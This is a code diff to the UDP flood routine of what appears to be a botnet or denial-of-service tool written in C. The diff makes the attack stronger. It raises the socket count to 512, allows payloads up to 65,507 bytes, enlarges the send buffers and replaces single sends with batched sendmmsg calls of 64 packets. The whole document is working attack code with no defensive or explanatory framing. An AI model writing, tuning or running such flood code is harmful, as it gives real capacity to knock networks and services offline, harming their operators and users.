@@ -11,7 +11,8 @@
 #include "udpcustom_attack.h"
 #include "../headers/protocol.h"
 
-#define UDP_CUSTOM_SOCKS 128
+#define UDP_CUSTOM_SOCKS 512
+#define BATCH 64
 
 void* udpcustom_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
@@ -20,8 +21,8 @@ void* udpcustom_attack(void* arg) {
     attack_option* opt_psize   = find_option(params, OPT_PSIZE);
     attack_option* opt_payload = find_option(params, OPT_PAYLOAD);
 
-    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1450;
-    if (psize == 0 || psize > 1450) psize = 1450;
+    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1400;
+    if (psize == 0 || psize > 65507) psize = 1400;
 
     char *data = malloc(psize);
     if (!data) return NULL;
@@ -32,7 +33,7 @@ void* udpcustom_attack(void* arg) {
         memcpy(data, opt_payload->data, copy_len);
     }
 
-    int sndbuf = 1024 * 1024;
+    int sndbuf = 4 * 1024 * 1024;
     int fds[UDP_CUSTOM_SOCKS];
     int active = 0;
 
@@ -47,13 +48,25 @@ void* udpcustom_attack(void* arg) {
 
     if (active == 0) { free(data); return NULL; }
 
+    /* Pre-build sendmmsg batch — connected sockets need no destination */
+    struct mmsghdr msgs[BATCH];
+    struct iovec iovs[BATCH];
+
+    for (int i = 0; i < BATCH; i++) {
+        iovs[i].iov_base = data;
+        iovs[i].iov_len  = psize;
+        memset(&msgs[i], 0, sizeof(msgs[i]));
+        msgs[i].msg_hdr.msg_iov    = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+    }
+
     time_t end_time = time(NULL) + params->duration;
     uint64_t iter = 0;
 
     while (params->active) {
         for (int i = 0; i < UDP_CUSTOM_SOCKS; i++) {
             if (fds[i] == -1) continue;
-            send(fds[i], data, psize, MSG_NOSIGNAL);
+            sendmmsg(fds[i], msgs, BATCH, MSG_NOSIGNAL);
         }
         if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
     }
